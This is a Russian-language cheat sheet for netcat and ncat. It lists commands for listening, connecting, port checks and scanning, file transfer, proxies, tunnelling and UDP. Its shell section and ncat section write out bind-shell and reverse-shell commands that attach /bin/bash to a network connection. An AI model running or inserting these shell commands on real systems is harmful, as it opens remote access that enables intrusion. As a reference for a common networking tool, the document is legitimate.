Инструкция по nc / ncat / netcat

Основные режимы:
nc хост порт — подключиться к хосту
nc -l порт — слушать на порту
nc -l -p порт — слушать на указанном порту

Слушатель (сервер):
nc -l -p 1234 — слушать порт 1234
nc -l -k -p порт — продолжать слушать после разрыва соединения
nc -l -s адрес -p порт — слушать на конкретном IP

Клиент:
nc example.com 80 — подключиться к веб-серверу
nc -v хост порт — подробный вывод
nc -vz хост порт — проверить открыт ли порт
nc -n — не использовать DNS (только IP)

Таймауты:
nc -w секунды — таймаут соединения
nc -i секунды — задержка между отправкой строк

Передача файлов:
nc -l -p порт > файл — получить файл
nc хост порт < файл — отправить файл

Прокси:
nc -X версия -x прокси:порт хост порт — через прокси
версии: 4 (SOCKS4), 5 (SOCKS5), connect (HTTPS)

Шелл:
nc -l -p порт -e /bin/bash — привязать шелл (опасно!)
nc хост порт -e /bin/bash — обратный шелл

Сканирование портов:
nc -zv хост 1-1000 — сканировать порты 1-1000
nc -zv хост 22 80 443 — проверить конкретные порты

Перенаправление портов:
nc -l -p порт1 -c "nc хост порт2" — простой порт-форвардинг

Примеры:
nc -l -p 9999 — создать простой TCP сервер на 9999
nc localhost 9999 — подключиться к серверу
nc -v google.com 80 — проверить HTTP порт
nc -vz google.com 80 — быстрая проверка порта
nc -w 5 google.com 80 — с таймаутом 5 секунд
nc -l -p 8888 > received_file — получить файл через порт 8888
nc -w 3 host 8888 < file_to_send — отправить файл с таймаутом
nc -x proxy:8080 -X connect google.com 443 — через HTTPS прокси
nc -lvnp 4444 — слушать подробно без DNS
nc -lkp 4444 — постоянный слушатель
for port in {1..1024}; do nc -zv host $port; done — сканирование портов
nc -l -p 3333 | tar xzf - — получить и распаковать архив

HTTP-запрос:
    echo -e "GET / HTTP/1.1\nHost: google.com\n\n" | nc google.com 80
    
Чат:
nc -l -p 5555 — на одной машине
nc host 5555 — на другой машине

Проверка UDP:
nc -u host port — UDP режим
nc -lu -p port — UDP сервер

Безопасность:
nc --ssl host port — SSL соединение
nc --ssl-verify host port — с проверкой сертификата

Туннелирование:
mkfifo pipe; nc -l -p 8080 < pipe | nc host 80 > pipe — HTTP туннель

Ncat (улучшенный):
ncat -l -p port --keep-open --exec "/bin/bash" — Ncat с шеллом
ncat --ssl host port — встроенная SSL поддержка
ncat -l -p port --allow host — разрешить только определённые хосты
ncat --chat — режим чата с несколькими клиентами

Различия версий:
    nc — классический netcat
    ncat — из набора nmap, больше возможностей
    netcat-openbsd — безопасная версия из OpenBSD
    netcat-traditional — классическая версия
